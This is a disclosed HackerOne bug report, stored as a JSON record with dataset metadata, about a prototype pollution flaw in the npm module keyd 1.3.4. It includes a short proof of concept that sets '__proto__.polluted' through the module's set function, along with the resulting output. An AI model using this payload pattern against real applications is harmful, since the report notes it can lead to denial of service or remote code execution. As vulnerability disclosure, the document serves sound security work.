{
    "reported_to": "Node.js third-party modules",
    "reported_by": "d3lla ",
    "title": "[keyd] Prototype pollution",
    "content": "\nI would like to report a prototype pollution vulnerability in keyd module.\nIt allows an attacker to inject properties on Object.prototype.\nModule\nmodule name: keyd\nversion: 1.3.4\nnpm page: https://www.npmjs.com/package/keyd\nModule Description\nA small library for using and manipulating key paths in JavaScript.\nModule Stats\n[71] weekly downloads\nVulnerability\nVulnerability Description\nThe set function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\nSteps To Reproduce:\ninstall keyd module:\nnpm i keyd\nnpm i keyd\nSet the __proto__.polluted property of an object:\nCode 170 Bytes\n1\n2const keyd = require('keyd');\n3const obj = {};\n4console.log(\"Before : \" + obj.polluted);\n5keyd({}).set('__proto__.polluted', 'yes');\n6console.log(\"After : \" + obj.polluted);\nOutput:\nCode 31 Bytes\n1\n2Before : undefined\n3After : yes\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.1.0\nNPM VERSION: 6.14.5\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Modification of Assumed-Immutable Data (MAID)"
    ],
    "screenshots": {},
    "disclosed_date": 1600095060,
    "report_url": "https://hackerone.com/reports/877515",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "CODE",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}